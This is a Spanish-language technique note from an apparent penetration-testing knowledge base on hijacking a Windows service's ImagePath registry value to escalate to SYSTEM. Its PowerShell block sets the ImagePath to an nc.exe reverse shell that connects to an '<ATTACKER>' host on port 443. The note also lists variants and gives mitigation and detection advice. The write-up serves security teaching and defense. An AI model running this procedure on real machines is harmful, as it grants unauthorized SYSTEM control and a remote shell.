---
topic: Secuestro de ImagePath en servicios de Windows
tags: [windows, services, registry, privesc, persistence]
---

# Secuestro de ImagePath en servicios de Windows

[🌐 English](service-imagepath-hijack.en.md) | **Español**

## Concepto

Windows crea procesos de servicio a partir del valor `ImagePath` del registro. Si un usuario sin privilegios puede escribir en la clave de un servicio que se ejecuta como `LocalSystem` y puede iniciarlo, puede sustituir el binario por uno propio y obtener SYSTEM.

## Cuándo aplica

- `sc sdshow <service>` concede `RP` o `WD` a `AU`/`Authenticated Users`.
- El servicio usa `ObjectName=LocalSystem`.
- El servicio está detenido o se puede reiniciar.

## Procedimiento

1. Enumerar servicios y sus permisos con `accesschk` o `sc sdshow`.
2. Copiar un ejecutable controlado a una ruta escribible.
3. Cambiar `ImagePath` y arrancar el servicio.
4. Recibir la shell como SYSTEM.

```powershell
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
sc qc <SERVICE>
sc sdshow <SERVICE>
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\<SERVICE> -Name ImagePath -Value "C:\Windows\Temp\nc.exe -e cmd <ATTACKER> 443"
Start-Service <SERVICE>
```

## Variantes

- Modificar `ServiceDll` en servicios `svchost`.
- Aprovechar `FailureCommand` si el servicio falla.
- Usar `sc config binPath=` cuando se permite.

## Limitaciones

- Se necesita permiso de escritura y de inicio.
- Algunos servicios verifican la firma del binario.
- Los cambios en el registro pueden auditarse.

## Mitigación y detección

- Revisar las ACL de las claves de servicio.
- Ejecutar servicios con cuentas de bajo privilegio.
- Monitorizar cambios de `ImagePath` y `ServiceDll`.

## Referencias

- <https://learn.microsoft.com/en-us/windows/win32/services/service-registry-information>
- <https://attack.mitre.org/techniques/T1543/003/>
- <https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk>
